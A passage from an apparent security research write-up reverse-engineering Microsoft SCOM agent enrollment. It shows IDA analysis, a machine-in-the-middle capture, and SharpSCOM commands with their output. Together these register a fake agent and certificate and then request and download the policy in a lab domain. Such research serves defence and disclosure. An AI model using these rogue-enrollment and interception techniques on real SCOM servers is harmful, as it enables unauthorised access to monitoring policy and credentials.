</span></span><span class=line><span class=cl><span class=nx>Binary</span> <span class=nx>file</span> <span class=p>.</span><span class=o>/</span><span class=nx>MOMConnector</span><span class=p>.</span><span class=nx>dll</span> <span class=nx>matches</span>
</span></span></code></pre></div><p>Loading this DLL into IDA and searching for references to <code>IMOM</code> and <code>BMOM</code>, we locate a few potential candidate functions.</p><p><img alt=image.png loading=lazy src=/scom/image%2020.png></p><p>Inside function <code>sub_1800450A0</code> we see the ASCII string <code>IMOM</code> being referenced inside of what we suspect is our MOM header structure.</p><p><img alt=image.png loading=lazy src=/scom/image%2021.png></p><p>As we had already documented this structure, we could reuse this structure definition inside of IDA&rsquo;s Local Types view to aid with our analysis.</p><p><img alt="Pasted image 20251010184341.png" loading=lazy src=/scom/Pasted_image_20251010184341.png></p><p>Applying this structure definition resulted in the below.</p><p><img alt="Pasted image 20251010182242.png" loading=lazy src=/scom/Pasted_image_20251010182242.png></p><p>After our structure was parsed, we saw a reference to our currently unknown value <code>agent_nonce</code> inside of function <code>sub_1800450A0</code>.</p><p><img alt="Pasted image 20251010182712.png" loading=lazy src=/scom/Pasted_image_20251010182712.png></p><p>Here we see that this value is seeded via a call to <code>GetSystemTimeAsFileTime</code>. The high bytes from this timestamp were then used to create the value the agent sent. Implementing this in C# was straightforward using the below.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=kt>long</span> <span class=n>fileTime64</span> <span class=p>=</span> <span class=n>DateTime</span><span class=p>.</span><span class=n>UtcNow</span><span class=p>.</span><span class=n>ToFileTimeUtc</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kt>uint</span> <span class=n>dwHighDateTime</span> <span class=p>=</span> <span class=p>(</span><span class=kt>uint</span><span class=p>)(</span><span class=n>fileTime64</span> <span class=p>&gt;&gt;</span> <span class=m>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>byte</span><span class=p>[]</span> <span class=n>fileTimeBytes</span> <span class=p>=</span> <span class=k>new</span> <span class=kt>byte</span><span class=p>[</span><span class=m>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fileTimeBytes</span><span class=p>[</span><span class=m>0</span><span class=p>]</span> <span class=p>=</span> <span class=p>(</span><span class=kt>byte</span><span class=p>)(</span><span class=n>dwHighDateTime</span> <span class=p>&amp;</span> <span class=m>0xFF</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>fileTimeBytes</span><span class=p>[</span><span class=m>1</span><span class=p>]</span> <span class=p>=</span> <span class=p>(</span><span class=kt>byte</span><span class=p>)((</span><span class=n>dwHighDateTime</span> <span class=p>&gt;&gt;</span> <span class=m>8</span><span class=p>)</span> <span class=p>&amp;</span> <span class=m>0xFF</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>fileTimeBytes</span><span class=p>[</span><span class=m>2</span><span class=p>]</span> <span class=p>=</span> <span class=p>(</span><span class=kt>byte</span><span class=p>)((</span><span class=n>dwHighDateTime</span> <span class=p>&gt;&gt;</span> <span class=m>16</span><span class=p>)</span> <span class=p>&amp;</span> <span class=m>0xFF</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>fileTimeBytes</span><span class=p>[</span><span class=m>3</span><span class=p>]</span> <span class=p>=</span> <span class=p>(</span><span class=kt>byte</span><span class=p>)((</span><span class=n>dwHighDateTime</span> <span class=p>&gt;&gt;</span> <span class=m>24</span><span class=p>)</span> <span class=p>&amp;</span> <span class=m>0xFF</span><span class=p>);</span>
</span></span></code></pre></div><h3 id=writing-a-scom-mitm>Writing a SCOM MiTM<a hidden class=anchor aria-hidden=true href=#writing-a-scom-mitm>#</a></h3><p>With the fields for the SCOM headers documented, we could begin analyzing the message body for each message sent by the agent during enrollment. In order to capture more than just the first message the agent sent, we needed to extend our code beyond a simple server and into a complete machine-in-the-middle (MitM) attack.</p><p>To impersonate the connecting client, we needed to send the received message over a local named pipe to another process running in the security context of the authenticating client. The below diagram illustrates the setup and the required security contexts for each step in the chain.</p><p><img alt="Untitled Diagram-Page-24.drawio (6).png" loading=lazy src=/scom/Untitled_Diagram-Page-24.drawio_(6).png></p><p>After setting up our MiTM, we installed the SCOM agent on a freshly deployed VM and captured the below requests coming in.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>SCOM</span> <span class=n>MiTM</span> <span class=n>running</span> <span class=n>in</span> <span class=n>server</span> <span class=n>mode</span><span class=p>.</span> <span class=n>Listening</span> <span class=n>on</span> <span class=n>port</span> <span class=mi>5000</span> <span class=n>using</span> <span class=n>pipename</span> <span class=n>scompipe</span>
</span></span><span class=line><span class=cl>	<span class=p>[</span><span class=n>SERVER</span><span class=p>]</span><span class=o>:</span> <span class=n>Server</span> <span class=nl>authority</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>	<span class=p>[</span><span class=n>SERVER</span><span class=p>]</span><span class=o>:</span> <span class=n>Server</span> <span class=n>context</span> <span class=nl>user</span><span class=p>:</span> <span class=n>INITECH</span><span class=err>\</span><span class=n>SERVER</span><span class=o>-</span><span class=mi>2019</span><span class=err>$</span>
</span></span><span class=line><span class=cl>	<span class=p>[</span><span class=n>SERVER</span><span class=p>]</span><span class=o>:</span> <span class=n>Server</span> <span class=n>session</span> <span class=nl>key</span><span class=p>:</span> <span class=n>A0</span><span class=o>-</span><span class=mi>55</span><span class=o>-</span><span class=n>E5</span><span class=o>-</span><span class=mi>0</span><span class=n>E</span><span class=o>-</span><span class=n>D9</span><span class=o>-</span><span class=n>A4</span><span class=o>-</span><span class=mi>7</span><span class=n>C</span><span class=o>-</span><span class=mi>6</span><span class=n>A</span><span class=o>-</span><span class=n>AA</span><span class=o>-</span><span class=mf>8E-32</span><span class=o>-</span><span class=mi>1</span><span class=n>A</span><span class=o>-</span><span class=mi>45</span><span class=o>-</span><span class=mi>4</span><span class=n>A</span><span class=o>-</span><span class=mo>06</span><span class=o>-</span><span class=mi>0</span><span class=n>A</span><span class=o>-</span><span class=n>AD</span><span class=o>-</span><span class=n>DE</span><span class=o>-</span><span class=mi>3</span><span class=n>D</span><span class=o>-</span><span class=mi>4</span><span class=n>D</span><span class=o>-</span><span class=mi>87</span><span class=o>-</span><span class=mo>05</span><span class=o>-</span><span class=n>B3</span><span class=o>-</span><span class=mi>8</span><span class=n>D</span><span class=o>-</span><span class=mi>6</span><span class=n>C</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>6</span><span class=n>B</span><span class=o>-</span><span class=mi>36</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mf>0E-19</span><span class=o>-</span><span class=mi>11</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>AGENT</span> <span class=o>&gt;&gt;&gt;&gt;&gt;&gt;</span> <span class=n>SCOM</span><span class=p>]</span> <span class=p>[</span><span class=n>DECRYPT</span><span class=p>]</span> <span class=n>plaintext</span> <span class=n>wrap</span> <span class=nf>token</span> <span class=p>(</span><span class=n>base64</span><span class=p>)</span><span class=o>:</span> <span class=n>AyBzGQQgBCCMAAAAXQAAAHicm</span><span class=o>+</span><span class=n>eqwsHIwMBQA8TMQOzk6</span><span class=o>+/</span><span class=n>LDhRY3</span><span class=o>+</span><span class=n>tVk3ygXspCQpD9zrOFHPZn2V9sW3</span><span class=o>/</span><span class=n>Re3PzuamaE0JYPYHqOBlAgI1BPoWBAV2eAQ0oz7wNsoaBEcoXAOL</span><span class=o>/</span><span class=n>aAAAaq4s</span><span class=o>/</span><span class=n>w</span><span class=o>==</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>AGENT</span> <span class=o>&gt;&gt;&gt;&gt;&gt;&gt;</span> <span class=n>SCOM</span><span class=p>]</span> <span class=p>[</span><span class=n>DECRYPT</span><span class=p>]</span> <span class=n>zlib</span> <span class=n>decompressed</span> <span class=n>wrap</span> <span class=nf>token</span> <span class=p>(</span><span class=n>base64</span><span class=p>)</span><span class=o>:</span> <span class=n>nkUkCAEAAAB8AAAAAwAAAEJNT00HAQAAr41KfGPAfxo4GBEH3OahCD</span><span class=o>/</span><span class=n>NB</span><span class=o>+</span><span class=n>i2r9FLs4POlSmQVAVJTU9NCQAAAAAABgAfZAAAP80H6Lav0Uuzg86VKZBUBQAAAAAAAAAAAAAAAAAAAAAjmdsBAAAAAAEAAAAAAAAAEAAAAP</span><span class=c1>////////////////////8=
</span></span></span><span class=line><span class=cl><span class=p>[</span><span class=n>AGENT</span> <span class=o>&gt;&gt;&gt;&gt;&gt;&gt;</span> <span class=n>SCOM</span><span class=p>]</span> <span class=n>sending</span> <span class=n>agent</span> <span class=n>data</span> <span class=n>to</span> <span class=n>pipe</span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>AGENT</span> <span class=o>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span> <span class=n>SCOM</span><span class=p>]</span> <span class=n>waiting</span> <span class=k>for</span> <span class=n>server</span> <span class=n>response</span> <span class=n>from</span> <span class=n>pipe</span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>AGENT</span> <span class=o>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span> <span class=n>SCOM</span><span class=p>]</span> <span class=n>got</span> <span class=n>data</span> <span class=n>from</span> <span class=n>pipe</span><span class=p>.</span> <span class=n>Sending</span> <span class=n>to</span> <span class=n>agent</span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>AGENT</span> <span class=o>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span> <span class=n>SCOM</span><span class=p>]</span> <span class=p>[</span><span class=n>ENCRYPT</span><span class=p>]</span> <span class=n>plaintext</span> <span class=n>wrap</span> <span class=n>token</span> <span class=nf>data</span> <span class=p>(</span><span class=n>base64</span><span class=p>)</span><span class=o>:</span> <span class=n>AyBzGQQgBCAEAQAAiAAAAHicm</span><span class=o>+</span><span class=n>eqwsHIwMDxhYGBgRmInXz9fdmBAut7vWqSD9RLWUgIst95tpCja1qZUFf4PLsbEQYbTy9</span><span class=o>/</span><span class=mi>5</span><span class=n>OwJVMfJAAJMDOIpDAwV3Bbcj6ZlvO</span><span class=o>/</span><span class=n>c1VAgUD9vk</span><span class=o>/</span><span class=mi>1</span><span class=n>Z9hfb1l</span><span class=o>/</span><span class=mo>03</span><span class=n>tx8bqrmhBBW5Zm3GUGq7</span><span class=o>/</span><span class=mi>5</span><span class=n>igANSzVCBmvGWAjNUoWb8RjIDAA1pUPE</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>AGENT</span> <span class=o>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span> <span class=n>SCOM</span><span class=p>]</span> <span class=p>[</span><span class=n>ENCRYPT</span><span class=p>]</span> <span class=n>zlib</span> <span class=n>decompressed</span> <span class=n>wrap</span> <span class=nf>token</span> <span class=p>(</span><span class=n>base64</span><span class=p>)</span><span class=o>:</span> <span class=n>nkUkCAEAAAj0AAAAAwAAAEJNT00HAQAAr41KfGPAfxo4GBEH3OahCIqWdhKKV54</span><span class=o>+</span><span class=mf>2F</span><span class=n>gwscun4kNJTU9NCQAAAAAAAgAXZAAAeAs4C</span><span class=o>+</span><span class=n>KWaO</span><span class=o>+</span><span class=n>JuoBwEH</span><span class=o>+</span><span class=n>esj</span><span class=o>/</span><span class=n>NB</span><span class=o>+</span><span class=n>i2r9FLs4POlSmQVAUjmdsBAAAAAN36AAAAAAAAAAAAAElNT00JAAAAAAACABdkAAB4CzgL4pZo74m6gHAQf56yP80H6Lav0Uuzg86VKZBUBSSZ2wEAAAAA7foAAAAAAAAAAAAASU1PTQkAAAAAAAIAF2QAAHgLOAvilmjvibqAcBB</span><span class=o>/</span><span class=n>nrI</span><span class=o>/</span><span class=n>zQfotq</span><span class=o>/</span><span class=n>RS7ODzpUpkFQFJZnbAQAAAAD7</span><span class=o>+</span><span class=n>gAAAAAAAAAAAAA</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>AGENT</span> <span class=o>&gt;&gt;&gt;&gt;&gt;&gt;</span> <span class=n>SCOM</span><span class=p>]</span> <span class=p>[</span><span class=n>DECRYPT</span><span class=p>]</span> <span class=n>plaintext</span> <span class=n>wrap</span> <span class=nf>token</span> <span class=p>(</span><span class=n>base64</span><span class=p>)</span><span class=o>:</span> <span class=n>AyBzGQQgBCByBQAALgQAAHicm</span><span class=o>+</span><span class=n>eqwsHEwMCQxMrAwAyknXz9fdkZGR</span><span class=o>&lt;</span><span class=n>TRIMMED</span> <span class=n>FOR</span> <span class=n>BREVITY</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>AGENT</span> <span class=o>&gt;&gt;&gt;&gt;&gt;&gt;</span> <span class=n>SCOM</span><span class=p>]</span> <span class=p>[</span><span class=n>DECRYPT</span><span class=p>]</span> <span class=n>zlib</span> <span class=n>decompressed</span> <span class=n>wrap</span> <span class=nf>token</span> <span class=p>(</span><span class=n>base64</span><span class=p>)</span><span class=o>:</span> <span class=n>nkUkCAIAAABiBQAAAwAAAEJNT00HAQA</span><span class=o>&lt;</span><span class=n>TRIMMED</span> <span class=n>FOR</span> <span class=n>BREVITY</span><span class=o>&gt;</span>
</span></span></code></pre></div><h3 id=analysis-of-enrollment-messages>Analysis of Enrollment Messages<a hidden class=anchor aria-hidden=true href=#analysis-of-enrollment-messages>#</a></h3><p>After capturing each message the agent sent during enrollment, we identified a total of four messages sent to the server prior to the policy data returning. Going forward, we will refer to them as the following:</p><ul><li>Agent registration message (MSG 1)</li><li>Certificate registration message (MSG 2)</li><li>Policy request message (MSG 3)</li><li>Policy download message (MSG 4)</li></ul><p>The below high level diagram illustrates the message exchange that both the agent and server performed during enrollment.</p><figure><img loading=lazy src=/scom/Untitled_Diagram-Page-11.drawio_%282%29.png width=750></figure><blockquote><p><strong>Note</strong>: To add further complexity to the mix, SCOM also supports multi-part messages where any of the above four messages can be combined and sent as a single request. For clarity, we will treat each message individually in this write-up but note that the SCOM agent will often send them together.</p></blockquote><h3 id=agent-registration-message-msg-1>Agent Registration Message (MSG 1)<a hidden class=anchor aria-hidden=true href=#agent-registration-message-msg-1>#</a></h3><p>This is the first message in the exchange used to register the agent with the SCOM management server. This message includes the SCOM header values we previously documented along with a series of bytes which identify the message (labeled as <code>Command</code>) and any arguments provided (labeled as <code>Payload</code>).</p><p><img alt=notion_5.drawio.png loading=lazy src=/scom/notion_5.drawio.png></p><p>To test our assumptions, we added functionality to SharpSCOM to connect over port <em>5723/TCP</em> and send individual messages as binary data.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>SharpSCOM.exe RegisterAgent /managementgroup:SCOM1 /server:scom-om1.ludus.domain /hostname:fake1.ludus.domain
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>█▀ █ █ ▄▀█ █▀█ █▀█ █▀ █▀▀ █▀█ █▀▄▀█
</span></span><span class=line><span class=cl>▄█ █▀█ █▀█ █▀▄ █▀▀ ▄█ █▄▄ █▄█ █ ▀ █
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Author: Matt Johnson - SpecterOps - v0.0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] Using Hostname: fake1.ludus.domain (24849d66-ef29-d6c4-4ff1-3e77a3e37a54)
</span></span><span class=line><span class=cl>[+] Using Management Group: SCOM1 (f0bc91d0-6de8-1fa8-d6bd-eb98f66672ad)
</span></span><span class=line><span class=cl>[+] Server: scom-om1.ludus.domain:5723
</span></span><span class=line><span class=cl>[+] Preparing to send single agent message...
</span></span><span class=line><span class=cl>[AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] plaintext wrap token (base64): AyBzGQQgBCCMAAAAXQAAAHicm+eqwsHIwMBQA8TMQOzk6+/LDhQwTJk7JSI6a0nz/y1NAQnP2V9mh3uw7jh3mNUy2nDjLodpnkB1nAwgwMYgn8LAgC7PgAbYbe6ArGFghPIFgPg/GgAAVlAsHQ==
</span></span><span class=line><span class=cl>[AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] zlib decompressed wrap token (base64): nkUkCAEAAAB8AAAAAwAAAEJNT00HAQAAMWSdlFhbaqSD/7SCUGDnB+lrV0gFuM7DBTlbMbG6QJZJTU9NCQAAAAAABgAfZAAA6WtXSAW4zsMFOVsxsbpAlgAAAAAAAAAAAAAAAAAAAAAHPNwBAAAAAAEAAAAAAAAAEAAAAP////////////////////8=
</span></span></code></pre></div><p>After sending the message, the below entry can be seen in the SCOM server event logs indicating our agent successfully registered.</p><p><img alt=image.png loading=lazy src=/scom/image%2019.png></p><h3 id=agent-certificate-registration-message-msg-2>Agent Certificate Registration Message (MSG 2)<a hidden class=anchor aria-hidden=true href=#agent-certificate-registration-message-msg-2>#</a></h3><p>After the agent successfully registered, a new public / private key pair and corresponding certificate is generated. The certificate is saved locally inside the <code>Microsoft Monitoring Agent</code> store while the certificate and associated public key are sent to the server inside the <code>Payload</code> field of the message.</p><p><img alt=notion_6.drawio.png loading=lazy src=/scom/notion_6.drawio.png></p><p>Once the SCOM server receives the public key, it is saved in the database and used to encrypt the <code>SecureData</code> section of the agent policy file. To replicate the structure of the certificate sent in the request, we need to locate the function responsible for generating the agent self signed certificate.</p><p>Loading the <code>HealthService.dll</code> into IDA, we see a number of certificate related functions are present in the imports table.</p><p><img alt=image.png loading=lazy src=/scom/image%2022.png></p><p>Searching for references to the <code>CertCreateSelfSignCertificate</code> function, we find a function at <code>sub_1801DF520</code> which constructs the relevant fields for the self signed certificate.</p><p><img alt=image.png loading=lazy src=/scom/image%2023.png></p><p>Inside <code>sub_1801DF520</code> we see the variables and flags which are provided to the <code>CertCreateSelfSignCertificate</code> function to generate the self signed certificate.</p><p><img alt=image.png loading=lazy src=/scom/image%2024.png></p><p>The generated certificate is then serialized with a call to to <code>CertSerializeCertificateStoreElement</code> before being stored in the Local Certificate store inside the Microsoft Monitoring Agent container.</p><p><img alt=image.png loading=lazy src=/scom/image%2025.png></p><p>By replicating this code in C# via pinvoke, we can generate our own self signed certificate. We then added a function to SharpSCOM to generate a new certificate, serialize the data, and send it to the server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>SharpSCOM.exe RegisterCertificate /managementgroup:SCOM1 /server:scom-om1.ludus.domain /hostname:fake1.ludus.domain
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>█▀ █ █ ▄▀█ █▀█ █▀█ █▀ █▀▀ █▀█ █▀▄▀█
</span></span><span class=line><span class=cl>▄█ █▀█ █▀█ █▀▄ █▀▀ ▄█ █▄▄ █▄█ █ ▀ █
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Author: Matt Johnson - SpecterOps - v0.0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] Using Hostname: fake1.ludus.domain (24849d66-ef29-d6c4-4ff1-3e77a3e37a54)
</span></span><span class=line><span class=cl>[+] Using Management Group: SCOM1 (f0bc91d0-6de8-1fa8-d6bd-eb98f66672ad)
</span></span><span class=line><span class=cl>[+] Server: scom-om1.ludus.domain:5723
</span></span><span class=line><span class=cl>[+] Preparing to send single agent message...
</span></span><span class=line><span class=cl>[+] Generating new agent certificate for fake1.ludus.domain
</span></span><span class=line><span class=cl>[+] Subject: CN=fake1.ludus.domain, OU=RunAs Account Encryption, O=Microsoft
</span></span><span class=line><span class=cl>[+] Serial Number: 4718FEBFD26B45A24405206C262C1F66
</span></span><span class=line><span class=cl>[+] Valid From: 10/26/2025 2:32:48 AM UTC
</span></span><span class=line><span class=cl>[+] Valid To: 10/26/2026 2:32:48 AM UTC
</span></span><span class=line><span class=cl>[+] Thumbprint: 7AA2A863985A965AA7E42061F5D344D17B68DB23
</span></span><span class=line><span class=cl>[+] Public Key (Hex): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] Certificate (DER Base64): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] Private Key (XML): <span class=nt>&lt;RSAKeyValue&gt;&lt;Modulus&gt;&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;&lt;/D&gt;&lt;/RSAKeyValue&gt;</span>
</span></span><span class=line><span class=cl>[+] [AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] plaintext wrap token (base64): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] [AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] zlib decompressed wrap token (base64): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span></code></pre></div><p>After sending the message, the below entry can be seen in the SCOM server event logs indicating the thumbprint of the certificate associated with the agent.</p><p><img loading=lazy src=/scom/attachment974345d47655109e98d034f93a4e760b.png></p><h3 id=policy-request-message-msg-3>Policy Request Message (MSG 3)<a hidden class=anchor aria-hidden=true href=#policy-request-message-msg-3>#</a></h3><p>Once the certificate is registered, the agent can request a copy of the current policy XML. A unique GUID value is generated to identify the policy request and is sent inside the <code>Payload</code> field of the message.</p><p><img alt=notion_7.drawio.png loading=lazy src=/scom/notion_7.drawio.png></p><p>Although we do not observe any entry in the event logs for this request; if the request succeeds, the server response will contain the name of the XML policy file which has been generated.</p><blockquote><p><strong>Note</strong>: The agent ID will be replaced with a server ID (generated from the server name) inside any server response messages.</p></blockquote><p><img alt="Untitled Diagram-Page-17.drawio (1).png" loading=lazy src=/scom/Untitled_Diagram-Page-17.drawio_(1).png></p><p>In addition, a unique 16-byte value (labeled <code>policy_id</code>) and two four-byte values (representing the policy length) are returned in the server response. The agent must reference these three values inside of MSG 4 to download the policy. To test this, we added a function to SharpSCOM to request the policy and parse out the relevant fields in the server response.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>SharpSCOM.exe RequestPolicy /managementgroup:SCOM1 /server:scom-om1.ludus.domain /hostname:fake1.ludus.domain
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>█▀ █ █ ▄▀█ █▀█ █▀█ █▀ █▀▀ █▀█ █▀▄▀█
</span></span><span class=line><span class=cl>▄█ █▀█ █▀█ █▀▄ █▀▀ ▄█ █▄▄ █▄█ █ ▀ █
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Author: Matt Johnson - SpecterOps - v0.0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] Using Hostname: fake1.ludus.domain (24849d66-ef29-d6c4-4ff1-3e77a3e37a54)
</span></span><span class=line><span class=cl>[+] Using Management Group: SCOM1 (f0bc91d0-6de8-1fa8-d6bd-eb98f66672ad)
</span></span><span class=line><span class=cl>[+] Server: scom-om1.ludus.domain:5723
</span></span><span class=line><span class=cl>[+] Preparing to send single agent message...
</span></span><span class=line><span class=cl>[+] [AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] plaintext wrap token (base64): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] [AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] zlib decompressed wrap token (base64): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] Waiting for server response...
</span></span><span class=line><span class=cl>[+] [AGENT <span class=err>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><span class=nt>&lt; SCOM</span><span class=err>]</span> <span class=err>[DECRYPT]</span> <span class=err>plaintext</span> <span class=err>wrap</span> <span class=err>token</span> <span class=err>(base64):</span> <span class=err>AyBzGQQgBCD+AAAA0QAAAHicm+eqwsHEwMDxjoGBgRmInXz9fdkZGRgMU+ZOiYjOWtL8f0tTQMJz9pOB3j12jrKrVm3W2Gnw/8VfT6A6DqB6oF4G8RQGBnT5tLktKprvj1zz/2hXvvhxVYi32x2gqQwMp1v5QBRDE1SvBTOYy3A2HkIDzRIA0YwMGkAyjcGUwYjBmMGSIQUIzRl0GVIZkoBiIJYJkG3BkAxkWQDFjBgMgSxjICsJKJsKps0YEoEiyUCVegwVDLkMOQyPTyi9SCl/4Nd7NF7jsMvBEgDLhkBP</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>[AGENT</span> <span class=err>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span> <span class=err>SCOM]</span> <span class=err>[DECRYPT]</span> <span class=err>zlib</span> <span class=err>decompressed</span> <span class=err>wrap</span> <span class=err>token</span> <span class=err>(base64):</span> <span class=err>nkUkCAIAAAjuAAAAAwAAAEJNT00HAQAAMWSdlFhbaqSD/7SCUGDnB8lRS4w+QR2qqrMouTD/6P1JTU9NCAAAAAIAAAAXZAAAyVFLjD5BHaqqsyi5MP/o/WadhCQp78TWT/E+d6PjelRLRtwBAAAAAMuFDgAAAAAAggAAAAIAAAA4AwAAAAAAAM1fAAAAAAAAF2QAEAAAAAABACgAAABmADUAMgAzADkAZABkADcALQBlAGIANQA3AC0ANABlADgAYwAtADgAYgAyADEALQAzAGIAYgA3AGUAYgBiADYAYQAzAGMANAAuAHgAbQBsAOPIIuhkd+</span><span class=na>BOjcVfKMNEwXQ=</span>
</span></span><span class=line><span class=cl><span class=s>[+]</span> <span class=err>Received</span> <span class=err>225</span> <span class=err>bytes</span> <span class=err>from</span> <span class=err>server</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>Server</span> <span class=err>registration</span> <span class=err>response</span> <span class=err>received</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>Generating</span> <span class=err>policy</span> <span class=err>download</span> <span class=err>message</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>server_guid:</span> <span class=err>C9-51-4B-8C-3E-41-1D-AA-AA-B3-28-B9-30-FF-E8-FD</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>policy_guid:</span> <span class=err>E3-C8-22-E8-64-77-E0-4E-8D-C5-5F-28-C3-44-C1-74</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>policy_length_1:</span> <span class=err>CD-5F-00-00</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>policy_length_2:</span> <span class=err>38-03-00-00</span>
</span></span></code></pre></div><h3 id=policy-download-message-msg-4>Policy Download Message (MSG 4)<a hidden class=anchor aria-hidden=true href=#policy-download-message-msg-4>#</a></h3><p>Now that the policy has been generated, the agent can request a download of the policy XML file. The format of this request must reference the three values returned in the server response to the policy download (MSG 3) for the request to succeed.</p><p><img alt="Untitled Diagram-Page-18.drawio.png" loading=lazy src=/scom/Untitled_Diagram-Page-18.drawio.png></p><p>We do not observe any entry in the event logs for this request; however, if the request succeeds, the server response will contain the XML policy data. Once again, we added a function to SharpSCOM to request the policy XML using the parsed values the server returned in MSG 3.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>SharpSCOM.exe DownloadPolicy /managementgroup:SCOM1 /server:scom-om1.ludus.domain /hostname:fake1.ludus.domain
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>█▀ █ █ ▄▀█ █▀█ █▀█ █▀ █▀▀ █▀█ █▀▄▀█
</span></span><span class=line><span class=cl>▄█ █▀█ █▀█ █▀▄ █▀▀ ▄█ █▄▄ █▄█ █ ▀ █
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Author: Matt Johnson - SpecterOps - v0.0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] Using Hostname: fake1.ludus.domain (24849d66-ef29-d6c4-4ff1-3e77a3e37a54)
</span></span><span class=line><span class=cl>[+] Using Management Group: SCOM1 (f0bc91d0-6de8-1fa8-d6bd-eb98f66672ad)
</span></span><span class=line><span class=cl>[+] Server: scom-om1.ludus.domain:5723
</span></span><span class=line><span class=cl>[+] Preparing to send single agent message...
</span></span><span class=line><span class=cl>[+] [AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] plaintext wrap token (base64): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] [AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] zlib decompressed wrap token (base64): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] Waiting for server response...
